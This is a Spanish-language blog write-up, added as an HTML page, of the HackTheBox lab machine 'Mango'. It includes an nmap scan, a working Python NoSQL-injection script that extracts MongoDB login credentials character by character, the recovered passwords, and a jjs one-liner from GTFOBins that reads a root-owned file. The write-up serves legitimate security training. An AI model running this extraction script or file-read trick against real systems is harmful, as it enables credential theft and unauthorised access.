@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  
+    <title>Mango HTB WriteUp :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTB Mango writeup Maquina Linux de dificultad media, con un nombre interesante que me recuerda a cierta base de datos. El proceso como siempre será: Escanear &amp;ndash;&amp;gt; Punto de entrada inicial &amp;ndash;&amp;gt; Usuario &amp;ndash;&amp;gt; Root
+Análisis inicial bash    # added to hosts as 10.10.10.171 Mango $ sudo nmap -sV -sC -sT -O -o nmapinitial Mango   Resultados del análisis inicial con nmap: bash    Starting Nmap 7." />
+<meta name="keywords" content="write, blog" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/es/posts/mango-writeup/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="Sergio Pérez" />
+
+
+<meta property="og:locale" content="es" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Mango HTB WriteUp :: Blog">
+<meta property="og:description" content="Write up de la máquina Linux Mango de HackTheBox. Dificultad media." />
+<meta property="og:url" content="https://raulmart.in/es/posts/mango-writeup/" />
+<meta property="og:site_name" content="Mango HTB WriteUp" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/mango.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-02-16 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/es/about/">Quiénes somos</a></li>
+        
+      
+        
+          <li><a href="/es/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>Español ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/es/about/">Quiénes somos</a></li>
+      
+    
+      
+        <li><a href="/es/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/es/posts/mango-writeup/">Mango HTB WriteUp</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-02-16 
+      </span>
+    
+    
+    <span class="post-author">:: Sergio Pérez</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/es/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/medium/">medium</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/mango.png" class="post-cover" alt="Mango HTB WriteUp" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="htb-mango-writeup">HTB Mango writeup<a href="#htb-mango-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Maquina Linux de dificultad media, con un nombre interesante que me recuerda a cierta base de datos.
+El proceso como siempre será: Escanear &ndash;&gt; Punto de entrada inicial &ndash;&gt; Usuario &ndash;&gt; Root</p>
+<h2 id="análisis-inicial">Análisis inicial<a href="#análisis-inicial" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+
+
+
+  <div class="collapsable-code">
+    <input id="698241357" type="checkbox"  />
+    <label for="698241357">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+# added to hosts as 10.10.10.171    Mango
+$ sudo nmap -sV -sC -sT -O -o nmapinitial Mango
+</code></pre>
+  </div>
+
+
+<p>Resultados del análisis inicial con <code>nmap</code>:
+
+
+
+  <div class="collapsable-code">
+    <input id="583271694" type="checkbox"  />
+    <label for="583271694">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-14 12:29 CET
+Nmap scan report for Mango (10.10.10.162)
+Host is up (0.10s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 403 Forbidden
+443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_  http/1.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/14%OT=22%CT=1%CU=37707%PV=Y%DS=2%DC=I%G=Y%TM=5E4684E
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=1
+OS:07%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
+OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=
+OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S&#43;%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 64.00 seconds
+
+</code></pre>
+  </div>
+
+</p>
+<p>Tenemos un servidor OpenSSH y un servidor Apache ejecutándose en los puertos  <code>80</code> y <code>443</code>.</p>
+<p><img src="images/443.png" alt="Website on port 443"></p>
+<p>La web en el puerto <code>443</code> es sospechosamente parecida a un conocido motor de búsqueda, vamos a intentar realizar algunas búsquedas interesantes:</p>
+<p><img src="images/searchs.png" alt="Some searchs in the website"></p>
+<p>Tras darle unas vueltas, parece que no hay nada fácilmente explotable, echémosle un ojo al enlace a la página de analíticas que aparece en la parte superior derecha.</p>
+<p><img src="images/analytics.png" alt="Some searchs in the website"></p>
+<p>Llegamos a una página con una especie de Excel online. Tampoco parece que haya nada explotable por aquí <code>:(</code></p>
+<p><img src="images/sheet.png" alt="Analytics sheet"></p>
+<h2 id="punto-de-entrada-inicial">Punto de entrada inicial<a href="#punto-de-entrada-inicial" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Revisando los resultados de nmap, nos fijamos en algo que habíamos pasado por alto, en el puerto <code>443</code> port tenemos un certificado con un &ldquo;Common name&rdquo; que todavia no hemos utilizado: <code>staging-order.mango.htb</code>. Lo añadimos al fichero <code>/etc/hosts</code>:</p>
+<p><img src="images/etchosts.png" alt="Adding subdomain to /etc/hosts"></p>
+<p>Navegando a <code>staging-order.mango.htb</code> obtenemos un formulario para iniciar sesión:</p>
+<p><img src="images/mangologin.png" alt="Login page"></p>
+<p>Con la pista del nombre, y probando alguna inyección NoSQL, llegamos a la conclusión de que la página esta ejecutando MongoDB y es vulnerable a NoSQLi. Usaremos <a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#brute-force-login-usernames-and-passwords-from-post-login">este</a> script para automatizar la extracción de datos mediante regex, tras modificarlo un poco y esperar obtenemos dos usuarios y sus respectivas contraseñas:</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="236759418" type="checkbox"  />
+    <label for="236759418">
+      <span class="collapsable-code__language">python</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-python" ><code>
+import requests
+import string
+
+url = &#34;http://staging-order.mango.htb&#34;
+headers = {&#34;Host&#34;: &#34;staging-order.mango.htb&#34;, &#34;User-Agent&#34;: &#34;Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0&#34;}
+possible_chars = list(string.ascii_letters) &#43; list(string.digits) &#43; [&#34;\\&#34;&#43;c for c in string.punctuation&#43;string.whitespace ]
+def get_password(username):
+    print(&#34;Extracting password of &#34;&#43;username)
+    params = {&#34;username&#34;:username, &#34;password[$regex]&#34;:&#34;&#34;, &#34;login&#34;: &#34;login&#34;}
+    password = &#34;^&#34;
+    while True:
+        for c in possible_chars:
+            params[&#34;password[$regex]&#34;] = password &#43; c &#43; &#34;.*&#34;
+            pr = requests.post(url, data=params, headers=headers, verify=False, allow_redirects=False)
+            if int(pr.status_code) == 302:
+                password &#43;= c
+                break
+        if c == possible_chars[-1]:
+            print(&#34;Found password &#34;&#43;password[1:].replace(&#34;\\&#34;, &#34;&#34;)&#43;&#34; for username &#34;&#43;username)
+            return password[1:].replace(&#34;\\&#34;, &#34;&#34;)
+
+def get_usernames():
+    usernames = []
+    params = {&#34;username[$regex]&#34;:&#34;&#34;, &#34;password[$regex]&#34;:&#34;.*&#34;, &#34;login&#34;: &#34;login&#34;}
+    for c in possible_chars:
+        username = &#34;^&#34; &#43; c
+        params[&#34;username[$regex]&#34;] = username &#43; &#34;.*&#34;
+        pr = requests.post(url, data=params, headers=headers, verify=False, allow_redirects=False)
+        if int(pr.status_code) == 302:
+            print(&#34;Found username starting with &#34;&#43;c)
+            while True:
+                for c2 in possible_chars:
+                    params[&#34;username[$regex]&#34;] = username &#43; c2 &#43; &#34;.*&#34;
+                    if int(requests.post(url, data=params, headers=headers, verify=False, allow_redirects=False).status_code) == 302:
+                        username &#43;= c2
+                        print(username)
+                        break
+
+                if c2 == possible_chars[-1]:
+                    print(&#34;Found username: &#34;&#43;username[1:])
+                    usernames.append(username[1:])
+                    break
+    return usernames
+
+
+for u in get_usernames():
+    get_password(u)
+</code></pre>
+  </div>
+
+
+Resultados:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="348196752" type="checkbox"  />
+    <label for="348196752">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+Found username: mango
+Extracting password of admin
+Found password t9KcS3&gt;!0B#2 for username admin
+Extracting password of mango
+Found password h3mXK8RhU~f{]f5H for username mango
+</code></pre>
+  </div>
+
+
+<p>Intentando iniciar sesión por SSH con el usuario admin nos da error, pero probando el usuario mango conseguimos nuestra primera shell en la máquina.</p>
+<p><img src="images/erroradminlogin.png" alt="Error trying to login as admin via SSH">
+<img src="images/successloginmango.png" alt="Successful login via SSH as mango user"></p>
+<h2 id="usuario">Usuario<a href="#usuario" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Revisando la carpeta <code>/home/mango</code> vemos que esta vacía, lo que quiere decir que la flag seguramente esté en la carpeta del usuario admin. Sabemos la contraseña del usuario admin, probemos a cambiar de usuario directamente con el comando <code>su</code>:</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="598316742" type="checkbox"  />
+    <label for="598316742">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+mango@mango:~$ su admin
+Password:
+$ /bin/bash
+To run a command as administrator (user &#34;root&#34;), use &#34;sudo &lt;command&gt;&#34;.
+See &#34;man sudo_root&#34; for details.
+
+admin@mango:/home/mango$  
+</code></pre>
+  </div>
+
+
+Ahora sí que tenemos la flag de usuario:</p>
+<p><img src="images/userflag.png" alt="User flag"></p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Tenemos acceso como usuario, vamos a intentar conseguir root.</p>
+<h3 id="enumeración">Enumeración<a href="#enumeración" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Lo primero que debemos hacer para saber cómo continuar la elevación es enumerar los binarios potencialmente explotables en el sistema. Para hacer esto, utilizaremos la <a href="https://github.com/SolomonSklash/htbenum">herramienta htbenum</a>. Al ver los resultados del escáner, tenemos dos binarios interesantes: <code>jjs</code> y<code> run-mailcamp</code>.</p>
+<p><img src="images/vulnbins.png" alt="Potentially vulnerable binaries"></p>
+<p>Ambos tienen una entrada en <a href="https://gtfobins.github.io/">GTFOBins</a>, por lo que intentaremos leer el archivo /root/root.txt. Primero intentaremos obtener el archivo raíz explotando <code>jjs</code>. Según GTFOBins, si ejecutamos este script, podemos leer el archivo que indicamos.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="873259146" type="checkbox"  />
+    <label for="873259146">
+      <span class="collapsable-code__language">Java</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Java" ><code>
+echo &#39;var BufferedReader = Java.type(&#34;java.io.BufferedReader&#34;);
+var FileReader = Java.type(&#34;java.io.FileReader&#34;);
+var br = new BufferedReader(new FileReader(&#34;/root/root.txt&#34;));
+while ((line = br.readLine()) != null) { print(line); }&#39; | jjs
+</code></pre>
+  </div>
+
+
+<p>Lo ejecutamos en la máquina de mango y &hellip; ¡voilá! Tenemos la flag de root.</p>
+<p><img src="images/rootflag.png" alt="Root flag"></p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Leer otras publicaciones</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://raulmart.in/es/posts/obscure-writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Obscurity HTB WriteUp</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/es/posts/h-c0n-papify-writeup/">
+                <span class="button__text">H-c0n 2020 qualifier Papify (1&amp;2)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
